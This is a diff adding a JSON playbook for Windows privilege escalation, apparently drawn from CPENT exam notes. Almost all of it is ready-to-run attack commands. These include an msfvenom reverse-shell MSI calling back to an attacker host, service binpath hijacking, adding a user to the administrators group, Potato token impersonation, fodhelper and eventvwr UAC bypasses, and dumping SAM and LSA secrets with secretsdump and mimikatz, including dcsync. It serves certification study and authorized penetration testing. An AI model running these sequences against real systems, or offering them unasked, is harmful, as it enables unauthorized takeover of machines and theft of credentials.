@@ -1,0 +1,231 @@
+{
+  "id": "windows-privesc-argha-dey-methodology",
+  "zone": "privilege-escalation",
+  "name": "Argha Dey Windows Privilege Escalation Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Quick Decision Flow for the Exam: Get shell \u2192 systeminfo/whoami /priv \u2192 WinPEAS/PowerUp \u2192 SeImpersonate check \u2192 service/registry/scheduled task perms \u2192 kernel CVEs. Includes A-Z technique catalogue (AlwaysInstallElevated, Unquoted Service Paths, DLL Hijacking, Potato Family, UAC Bypass, GPP, etc.) and kernel exploit catalogue.",
+  "examHabits": [
+    "Always check patch level first (wmic qfe) \u2014 kernel exploits can BSOD the target",
+    "Check SeImpersonatePrivilege first \u2014 fast win via PrintSpoofer/GodPotato if service account",
+    "Check services/registry/scheduled tasks/file perms \u2014 safe wins, no crash risk",
+    "Only reach for kernel CVE if OS is unpatched and no config-based win exists",
+    "Confirm final privilege with whoami /priv + whoami /groups and grab proof (flag/hash)",
+    "Document: technique used, CVE ID, affected component, command sequence, and remediation"
+  ],
+  "quickRef": "systeminfo; whoami /priv; winPEAS.exe; PowerUp Invoke-AllChecks; PrintSpoofer.exe -c cmd (if SeImpersonate); accesschk.exe for service perms",
+  "steps": [
+    {
+      "phase": "Phase 0 - Baseline Enumeration",
+      "techniques": [],
+      "tools": [
+        "winpeas",
+        "powerup",
+        "seatbelt",
+        "sherlock",
+        "watson",
+        "accesschk"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Low-priv shell on Windows",
+          "action": "systeminfo; whoami /priv; whoami /groups; whoami /all; hostname; wmic qfe get Caption,Description,HotFixID,InstalledOn; wmic os get osarchitecture; ver; ipconfig /all; netstat -ano; net user; net localgroup administrators",
+          "fallback": "Run winPEASx64.exe + PowerUp Invoke-AllChecks + Seatbelt -group=all + Sherlock Find-AllVulns"
+        },
+        {
+          "condition": "systeminfo output available",
+          "action": "Cross-reference OS build against CVE database (MS17-010, BlueKeep, PrintNightmare, etc.)",
+          "fallback": "Use Watson.exe or Windows-Exploit-Suggester.py against systeminfo output"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 1 - AlwaysInstallElevated",
+      "techniques": [
+        "always-install-elevated"
+      ],
+      "tools": [
+        "msfvenom"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Both MSI install registry keys set to 1",
+          "action": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi",
+          "fallback": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - Unquoted Service Paths",
+      "techniques": [
+        "unquoted-service-paths"
+      ],
+      "tools": [
+        "wmic",
+        "accesschk"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Service path unquoted with spaces (C:\\Program Files\\My App\\service.exe)",
+          "action": "icacls 'C:\\Program Files\\My App'; drop malicious Program.exe in writable parent; sc start 'VulnSvc'",
+          "fallback": "wmic service get name,displayname,pathname,startmode | findstr /i /v 'C:\\Windows\\'"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - DLL Hijacking",
+      "techniques": [
+        "dll-hijacking"
+      ],
+      "tools": [
+        "powerup",
+        "accesschk",
+        "msfvenom"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Service/app loads DLL from writable non-system directory",
+          "action": "Find-ProcessDLLHijack / Find-PathDLLHijack (PowerUp); craft malicious DLL with matching exports; msfvenom -f dll -o hijack.dll",
+          "fallback": "Process Monitor to find writable DLL load paths"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - Token Impersonation (Potato Family)",
+      "techniques": [
+        "token-impersonation"
+      ],
+      "tools": [
+        "printspoofer",
+        "godpotato",
+        "jucypotato",
+        "msfconsole"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SeImpersonatePrivilege = Enabled",
+          "action": "PrintSpoofer.exe -i -c cmd (most reliable on modern Win10/Server2016+); or GodPotato.exe -cmd 'C:\\payload.exe'",
+          "fallback": "JuicyPotato -l 1337 -p payload -t * -c {CLSID}; RoguePotato -r <attacker> -e payload -l 9999"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Weak Service / File Permissions",
+      "techniques": [
+        "weak-service-permissions",
+        "suid-abuse"
+      ],
+      "tools": [
+        "accesschk",
+        "icacls",
+        "powerup"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Service binary writable by non-admin",
+          "action": "accesschk.exe -uwcqv 'Authenticated Users' * -svc; sc config VulnSvc binpath= 'C:\\payload.exe'; sc start VulnSvc",
+          "fallback": "PowerUp: Get-ModifiableService -Verbose; Invoke-ServiceAbuse -Name 'VulnSvc' -Command 'net localgroup administrators user /add'"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 6 - Scheduled Tasks & Registry AutoRun",
+      "techniques": [
+        "cron-jobs"
+      ],
+      "tools": [
+        "powerup",
+        "icacls",
+        "reg"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Task runs as SYSTEM/admin with writable script",
+          "action": "schtasks /query /fo LIST /v; icacls 'C:\\Scripts\\backup.bat' \u2014 overwrite script",
+          "fallback": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; if writable, replace with payload"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 7 - GPP Cached Passwords / SYSVOL",
+      "techniques": [
+        "gpp-cached-passwords"
+      ],
+      "tools": [
+        "mimikatz",
+        "powerup"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SYSVOL XML files with cpassword",
+          "action": "findstr /S /I cpassword \\\\domain\\sysvol\\domain\\policies\\*.xml; gpp-decrypt <cpassword_value>",
+          "fallback": "Metasploit: post/windows/gather/credentials/gpp"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 8 - UAC Bypass",
+      "techniques": [
+        "uac-bypass"
+      ],
+      "tools": [
+        "msfconsole"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "User is local admin but running medium integrity",
+          "action": "fodhelper.exe bypass: reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'C:\\payload.exe' /f; reg add ... DelegateExecute /f; fodhelper.exe",
+          "fallback": "eventvwr.exe bypass: reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'C:\\payload.exe' /f; eventvwr.exe"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 9 - LSA Secrets & SAM Dump (for lateral movement)",
+      "techniques": [
+        "token-impersonation"
+      ],
+      "tools": [
+        "mimikatz",
+        "impacket"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Admin/SYSTEM already achieved",
+          "action": "reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive; reg save HKLM\\SECURITY security.hive; secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL; or mimikatz lsadump::sam; lsadump::secrets",
+          "fallback": "mimikatz privilege::debug; token::elevate; lsadump::dcsync (if DA)"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 10 - Kernel Exploits (CVE Catalogue)",
+      "techniques": [],
+      "tools": [
+        "msfconsole",
+        "searchsploit"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "OS is unpatched, systeminfo confirms vulnerable build",
+          "action": "MS08-067 (Conficker); MS16-032 (Secondary Logon); MS17-010 (EternalBlue); CVE-2019-0708 (BlueKeep); CVE-2020-1472 (Zerologon); CVE-2021-1675 (PrintNightmare); CVE-2021-1732 (Win32k); CVE-2021-3156 (Baron Samedit)",
+          "fallback": "Metasploit: local_exploit_suggester; or manual: searchsploit <cve> \u2192 -m \u2192 compile/run PoC"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 11 - Quick Decision Flow for the Exam",
+      "techniques": [],
+      "tools": [
+        "winpeas",
+        "powerup",
+        "printspoofer",
+        "msfconsole"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Low-priv shell obtained",
+          "action": "systeminfo + whoami /priv + whoami /groups \u2192 WinPEAS/PowerUp/Seatbelt/Sherlock in parallel \u2192 SeImpersonate first (PrintSpoofer) \u2192 service/registry/scheduled task/file perms \u2192 kernel CVE only if unpatched",
+          "fallback": "Always confirm final privilege with whoami /priv + whoami /groups + type C:\\Users\\Administrator\\Desktop\\root.txt"
+        }
+      ]
+    }
+  ]
+}
